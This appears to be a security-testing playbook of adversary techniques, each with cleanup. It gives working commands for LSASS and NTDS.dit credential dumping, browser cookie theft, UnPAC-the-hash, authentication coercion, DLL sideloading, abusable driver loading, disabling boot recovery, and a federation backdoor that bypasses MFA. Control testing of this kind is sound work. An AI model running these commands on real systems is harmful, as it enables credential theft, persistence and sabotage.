# General

## 2025 Index - Requirements

### Prerequisites

**Infrastructure**

- Mail server/relay to send emails
- Proxy/VPN in non-standard geolocation
- HTTP/S file hosting server
- Command-and-control server(s) with HTTPS and HTTP channels
- Accounts for : Cloud storage providers, remote assistance services
- Domain(s) and certificate(s) for infrastructure 
- HTTPS AitM proxy server (e.g. [Evilginx](https://github.com/kgretzky/evilginx2))
- An IaaS (AWS/Azure) tenant

**Tools/Script**

- PsExec : https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
- Coercer : https://github.com/p0dalirius/Coercer
- SharpHound : https://github.com/BloodHoundAD/SharpHound
- nmap : https://nmap.org/download.html
- Rubeus : https://github.com/GhostPack/Rubeus
- ntdscopy : https://github.com/2XXE-SRA/payload_resources/blob/master/powershell/ntdscopy.ps1
- SharpDPAPI : https://github.com/GhostPack/SharpDPAPI
- AADInternals : https://github.com/Gerenios/AADInternals
- TokenTactics : https://github.com/rvrsh3ll/TokenTactics
- GraphSpy : https://github.com/RedByte1337/GraphSpy
- File encryptor : https://github.com/2XXE-SRA/payload_resources/tree/master/coldencryptor

**Payloads**

- DLL payload for `DLL execution using Rundll32`
- DLL payload for `Sideload a DLL into a legitimate application`. 
  - This can be the same as the previous DLL payload as long as the appropriate exports are present
- Macro-enabled Office document for `Attachment - Macro`
- HTML file with file smuggling JavaScript for `Attachment - Smuggle ISO file in HTML`

# Impact

## bcdedit.exe - Inhibit system recovery

bcdedit.exe is a builtin Windows utility for managing boot configuration options.

bcdedit.exe is commonly used by ransomware to inhibit a Windows system's ability to recover

### Prerequisites

- Local administrator
- Document current recovery settings before execution
  - `bcdedit /enum {default}`

### Guidance

```
CMD> 
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
```

### Cleanup

Assuming default settings, cleanup commands are as follows:

```
CMD> 
bcdedit /set {default} recoveryenabled Yes
bcdedit /deletevalue {default} bootstatuspolicy
```

If values were non-default (based on `/enum` command), use those values instead

# Lateral Movement

## Windows Authentication Coercion - General guidance

https://github.com/p0dalirius/Coercer/

### Prerequisites

- [Coercer](https://github.com/p0dalirius/Coercer/) setup in a virtualenv
- Domain user credentials
- A target RPC interface, such as MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-DFSNM (DFSCoerce), or MS-FSRVP (ShadowCoerce)
    - Use Coercer's scan mode to identity valid interface/method combinations (`python Coercer.py scan --target {{ target }} ...`)
- A listener (e.g. `ntlmrelayx`, `responder`)

### Guidance

To trigger the coercion:

```
python Coercer.py coerce -u {{ domain_user }} -p {{ password }} --target {{ target }} -l {{ listener }} --filter-protocol-name {{ rpc_protocol }} --filter-method-name {{ rpc_method }}
```

- `rpc_protocol` and `rpc_method` can be determined from the output of the `scan` sub-command.
- If authenticating with a hash instead of a password, use `--hashes {{ lm:nt }}` instead of `-p {{ password }}`

### Notes

Different RPC interfaces may have individual tools to coerce authentication. For example:
- MS-RPRN: https://github.com/leechristensen/SpoolSample
- MS-EFSR: https://github.com/topotam/PetitPotam
- MS-DFSNM: https://github.com/Wh04m1001/DFSCoerce
- MS-FSRVP: https://github.com/ShutdownRepo/ShadowCoerce

# Command and Control

## Remote tool download - General guidance

Transfer tool into environment by downloading from the Internet

### Notes

- The maliciousness level of the binary should align with the intent of the test. For testing signature-based checks, use a known malicious tool, such as Mimikatz. For testing sandboxing or similar network security technologies, use an unknown yet still overtly malicious tool, such as one built around the current attack infrastructure. By default, start with the most malicious choice.

## Remote Assistance Software - General guidance

Select and use a well-known remote assistance software

### Prerequisites

1. An account for the service
2. Tool client downloaded and installed
   1. TeamViewer: https://www.teamviewer.com/
   2. GoTo Resolve: https://www.goto.com/it-management/resolve
   3. ConnectWise Control: https://control.connectwise.com/

### Notes

- Where possible, use remote assistance software already in use in the environment

# Defense Evasion

## Conditional Access Policy Modifications - General guidance

### Notes

- Create a new conditional access policy to avoid modifying production policies. Additionally, consider disabling the policy or setting it to report-only before modifying it. 

## DLL Search Order Hijacking - Certutil.exe sideloading

Additional executables potentially also vulnerable (refer to https://hijacklibs.net/entries/microsoft/built-in/netapi32.html).

### Prerequisites

- A DLL with the appropriate exports called `netapi32.dll`
  - Use: https://github.com/2XXE-SRA/payload_resources/tree/master/dllsideload (`payload.cpp` and `netapi32.def`)

### Guidance

Copy `C:\windows\system32\certutil.exe` to the same directory as the `netapi32.dll` payload then run `certutil.exe`

## DLL Search Order Hijacking - MpCmdRun.exe sideloading

MpCmdRun.exe is susceptible to a DLL sideloading hijack via its dependency on MpClient.dll

### Prerequisites

- A DLL with the appropriate exports called `mpclient.dll`
  - Use: https://github.com/2XXE-SRA/payload_resources/tree/master/dllsideload (`payload.cpp` and `mpclient.def`)

### Guidance

Copy `c:\program files\windows defender\mpcmdrun.exe` to the same directory as the `mpclient.dll` payload then run `mpcmdrun.exe`

## DLL Side Loading - General guidance

### Notes

- For a list of side-loadable DLLs, refer to https://hijacklibs.net/

## Malicious kernel driver use - load known-abusable driver

Kernel drivers can be used by attackers for a number of malicious activities, including hiding artifacts and tampering with endpoint security tools.

This bypasses the need for attackers to retrieve legitimate code-signing certificates for a driver they wrote.

### Prerequisites

- Local admin
- A known-abusable driver. Examples:
  - **ProcExp (SHA256 - 075de997497262a9d105afeadaaefc6348b25ce0e0126505c24aa9396c251e85)**
  - DBUtil_2_3 (SHA256 - 0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5)
  - RTCore64 (SHA256 - 01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd)
  - IQVM64 (SHA256 - 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b)

### Guidance

Example loading using sc.exe

```
cmd> sc.exe create {{ name }} type= kernel start= demand error= normal binpath= c:\windows\System32\Drivers\{{ sys_file }} displayname= {{ name }}
```

You can verify that the driver loaded by using [WinObj](https://learn.microsoft.com/en-us/sysinternals/downloads/winobj) from SysInternals (listed under Global??).

### Cleanup

- If using sc.exe, stop and delete the service then restart the machine and delete the driver file

### Notes

Drivers can be found in multiple places, including:

- Directly from vendor sites
- VirusTotal
- Aggregators like LOLDrivers and KDU
  - LOLDrivers: https://github.com/magicsword-io/LOLDrivers/tree/main/drivers
  - KDU: https://github.com/hfiref0x/KDU/

# Credential Access

## Browser credential dumping - Chromium-based via SharpChrome

https://github.com/GhostPack/SharpDPAPI

### Prerequisites

- kill all processes for the target browser
- compiled binary 
	- using Visual Studios: -> load solution file -> set to "Release" -> build
- For Chrome versions >= 127, App-Bound Encryption is enabled by default for cookies. To dump cookies, you will first need to dump the state key using a tool such as https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption

### Guidance

To dump cookies, use

```
SharpChrome cookies
```

For Chrome >= v127, first dump the state key (using the above linked tool). After compiling the tool, move it to the Chrome application directory (typically `%PROGRAMFILE%\Google\Chrome\Application`) then run

```
chrome_decrypt.exe
```

and note the state key. Then run SharpChrome with the `statekey` option:

```
SharpChrome cookies /statekey:{{ state_key }}
```

## UnPAC the Hash - via Rubeus.exe

UnPAC the Hash is an attack technique for retrieving the NTLM hash of a target user via PKINIT.

https://github.com/GhostPack/Rubeus

### Prerequisites

- compiled binary 
	- using Visual Studios: -> load solution file -> set to "Release" -> build
- The certificate for the target user
  - This can be set on the target user using a tool like [Whisker](https://github.com/eladshamir/Whisker) (`cmd> Whisker.exe add /target:{{ user }}`).

### Guidance

```
cmd> Rubeus.exe asktgt /getcredentials /user:"{{ domain_user }}" /certificate:"{{ certificate_b64 }}" /password:"{{ certificate_password }}" /domain:"{{ domain_fqdn }}" /dc:"{{ domain_controller }}" /show
```

### Cleanup

If you generated a certificate for the user with Whisker (or a similar tool), delete the certificate. For Whisker, the command is: `cmd> Whisker.exe clear /target:{{ user }}`

### References

- https://shenaniganslabs.io/2021/06/21/Shadow-Credentials.html
- https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash

## Extract NTDS.dit Credentials - via existing shadow (no CLI)

Copy the required NTDS files from an existing shadow(s) without having the physical paths in the command

### Prerequisites

- Elevated command execution on a DC
- Sufficient free disk space on the DC (verify size of ntds.dit file against free disk space)
- Download script: https://github.com/2XXE-SRA/payload_resources/blob/master/powershell/ntdscopy.ps1
    - If the NTDS file is using a nonstandard path, change the relevant section in the script (`$ditpath = ...`)
- If there are no shadows containing the the appropriate SYSTEM and NTDS.dit files, create them
  - for example `vssadmin create shadow /for=c: {{ drive_letter }}` and `wmic shadowcopy call create Volume="{{ drive_letter }}` can be used
  - Note: this activity is not part of the test case itself, so it should not affect the outcome
  - Note: sometimes the NTDS is installed on a different drive from the Windows install
    - for such cases, locate the drive containing the NTDS.dit file via `reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters` then create a shadow for that drive

### Guidance

```
PS> mkdir {{ outdir }}
PS> .\ntdscopy.ps1 {{ sys_shadow_number }} {{ ntds_shadow_number }} {{ outdir }}
```

- `sys_shadow_number` is the shadow ID of the shadow containing the SYSTEM registry 
- `ntds_shadow_number` is the shadow ID of the shadow containing the NTDS.dit 
- This script will create two files in the `{{ outdir }}`, `one` and `two`

### Cleanup

- Delete the newly created files: `{{ outdir }}\one` and `{{ outdir }}\two`
- If shadows were created as part of the setup, delete them

## LSASS dumping using comsvcs.dll - via rundll32.exe

Use `rundll32.exe` to call the `MiniDump` export from `comsvcs.dll`

### Prerequisites

- Administrator rights
- SeDebugPrivilege

### Guidance

```
shell> rundll32.exe c:\windows\system32\comsvcs.dll MiniDump {{ lsass_pid }} {{ outpath }} full
```

This command must be run from a shell process that has `SeDebugPrivilege` enabled. 
PowerShell should work to this end. 

You can acquire `SeDebugPrivilege` for `cmd.exe` by:
- launching it as `SYSTEM` via Sysinternals' `PsExec` (`psexec -sid cmd`). 
- using `wmic.exe` to launch a process with all privileges enabled (`wmic.exe /privileges:enable process call create cmd`)
 
Alternatively, you can use this VBScript file from `modexp`: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ (`cscript procdump.vbs lsass.exe`)

### Cleanup

- Delete the dump file

# Persistence

## GPO Modifications - General guidance

### Guidance

To create and modify a domain GPO via the Group Policy Editor:

1. Log onto domain controller as domain admin
2. Open the Server Manager -> Tools -> Group Policy Management
3. On the left menu -> Expand the forest/domains sections then locate the target domain
4. Expand the target domain and locate the "Group Policy Objects" folder
5. Right-click the folder -> New -> Enter a name 
6. Locate the newly created GPO -> right-click -> GPO Status -> Un-check enabled
7. Edit the GPO's setting(s) as desired

If targeting an existing policy, skip steps 5 and 6.

### Cleanup

Delete the GPO if using a new GPO, otherwise revert any settings changes

### Notes

Create a new group policy object to avoid modifying production policies. Additionally, consider disabling the policy before modifying it. 

## Identity Providers - New Entra Global Admin

### Prerequisites

- Have the Microsoft Graph (`Microsoft.Graph`) PowerShell module installed and be connected to the tenant (`Connect-MgGraph`)
  - https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation?view=graph-powershell-1.0
  - You will need the Directory read/write scope enabled. Use `Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"`
- Retrieve the target user object ID via `$user = Get-MgUser -Filter "userPrincipalName eq '{{ upn }}'"`
- Retrieve the target role ID via `$roleDefinition = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'Global Administrator'"`

### Guidance

Create the role assignment

```
$roleAssignment = New-MgRoleManagementDirectoryRoleAssignment -DirectoryScopeId / -PrincipalId $user.Id -RoleDefinitionId $roleDefinition.Id
```

- the `$user` and `$roleDefinition` variables are retrieved using the commands in the above prerequisites section. You can replace them with the user/role IDs if you've retrieved them from elsewhere
- this will return an assignment ID. Make note of this ID if you plan to delete the assignment via PowerShell

### Cleanup

Delete the role assignment either via the console or PowerShell 

```
Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId {{ assignment_id }}
```

### References

- https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/manage-roles-portal

## Scheduled Task Persistence - via schtasks.exe

Use built-in schtasks.exe to persist by creating a scheduled task

### Guidance

```
CMD> schtasks /Create /SC DAILY /TN "{{ taskname }}" /TR "{{ command }}" /ST 09:00
```

### Cleanup

```
CMD> schtasks /delete /tn "{{ taskname }}" /f
```

## Azure AD Domain Federation - Backdoor via AADInternals

Use AADInternals to create a backdoor federation domain for persisting access to an environment.

### Prerequisites

- AADInternals installed
  - `Install-Module AADInternals`
- Permissions to modify domain authentication settings
  - and an access token for the user with these permissions, referred to as `$at` in example commands. To retrieve a token, use `$at=Get-AADIntAccessTokenForAADGraph -Credentials (get-credential)` and proceed through the prompts
- A target verified domain in Azure AD
  - To add a domain, Go to Azure AD -> custom domain names -> add -> set the provided DNS records for your domain -> wait for the verification to compelete
- A user with an immutable ID set
  - To set an immutable ID for a user: `Set-AADIntUser -UserPrincipalName {{ upn_or_email }} -ImmutableId "{{ id }}" -AccessToken $at` where the `id` is an arbitrary unnique value

### Guidance

To set the backdoor 

```
PS> ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "{{ domain }}"
```

Optionally, to use the backdoor:

```
Open-AADIntOffice365Portal -ImmutableID {{ id }} -UseBuiltInCertificate -ByPassMFA $true -Issuer {{ issuer }}
```

- `id` is the immutable ID of the target user
- `issuer` is the IssuerUri provided in the output of the previous command 

This works for any user in the tenant, regardless of their domain.

### Cleanup

- Delete the domain

### Notes

- The domain must be verified for the backdoor to work

### References

- https://o365blog.com/post/aadbackdoor/
- https://www.mandiant.com/resources/blog/detecting-microsoft-365-azure-active-directory-backdoors

# Initial Access

## Suspicious connections - General guidance

### Guidance

When using a browser, you can override the user agent string by using an extension. For example:

- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg

You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.

## Known malicious link - URLHaus tagged link

Retrieve and send a known-malicious link from URLHaus that is currently online

### Prerequisites

- Retrieve link from URLHaus CSV export

```
bash> 
tmpd=$(mktemp -d)
zipf="$tmpd/csv.zip"
curl -LsSo $zipf https://urlhaus.abuse.ch/downloads/csv/
unzip $zipf -d $tmpd > /dev/null
grep -ir --include "*.txt" "online.*emotet" $tmpd | grep -oP "http.*?\"" | grep -v "https://urlhaus.abuse.ch" | shuf
rm -rf $tmpd
```

Note: this example looks for links tagged "emotet" but this can be changed as needed (https://urlhaus.abuse.ch/browse/)

## Teams phishing - General guidance

### Prerequisites

- You can use TeamsEnum (https://github.com/sse-secure-systems/TeamsEnum) to determine if the tenant allows messages from external tenants
    - `python TeamsEnum.py -e {{ target_email }} ...`

## MFA Push Spam - General guidance

Push-based MFA systems are susceptible to abuse by attackers because they allow an attacker to send a large volume of MFA requests to a user in order to induce that user to accept the prompt in the hopes it ends the requests.

Spam a target user with MFA approval prompts. Unlike a real-world scenario, this is not meant to test the human response to being inundated with MFA requests but rather the technical security controls for such a situation.

### Guidance

Send at least 10 MFA requests to the target user

### Notes

- If MFA is in place, but it does not use some form of zero-knowledge approval (e.g. push notification accept, SMS accept, etc), then it should be considered a block. For example, if the MFA systems requires entering a one-time code, then it would not be susceptible to this attack and therefore be blocked. If no MFA is enforced, it should be considered not blocked.

## Known malicious link - QR code generation

Generate a QR code for a known-malicious link

### Prerequisites

- Install `qrencode` (https://fukuchi.org/works/qrencode/), either directly or from a package manager (e.g. `apt install qrencode`)

### Guidance

To generate a QR code:

```
qrencode -o {{ outfile }} {{ link }}
```

# Exfiltration

## Exfiltration to cloud storage - General guidance

Select and use a well-known cloud storage service

### Prerequisites

1. An account for the service
2. Tool client downloaded and installed
   1. Generic: https://rclone.org/downloads/
   2. MEGA: https://mega.io/desktop
   3. Dropbox: https://www.dropbox.com/install

### Notes

- Where possible, use cloud storage service already in use in the environment

# Collection

## Collection from SharePoint - Accessing SharePoint via GraphSpy

https://github.com/RedByte1337/GraphSpy

### Prerequisites

- GraphSpy installed in a virtualenv and running
- An access token with the `Sites.Read.All` permission
  - Import the GraphSpy and set as the active token

### Guidance

To search SharePoint:

- In GraphSpy -> Custom -> Generic MSGraph Search -> Search type = "driveItem"

To download from SharePoint:

- From any of the pages that return file listings (e.g. SharePoint -> Files, Custom Search), you can download the file via the download button in the results list

### Notes

If you are using [roadtx](https://github.com/dirkjanm/ROADtools) to retrieve tokens, you can use the getscope command to find clients with the appropriate scope. 
`roadtx getscope -s Sites.Read.All` will find clients that can read from SharePoint/Drive, such as `d326c1ce-6cc6-4de2-bebc-4591e5e13ef0` (SharePoint). 
This client is also FOCI-compatible, so you can use a refresh token to mint an access token (e.g. `roadtx refreshtokento --tokens-stdout -s https://graph.microsoft.com/Sites.Read.All -c d326c1ce-6cc6-4de2-bebc-4591e5e13ef0`).

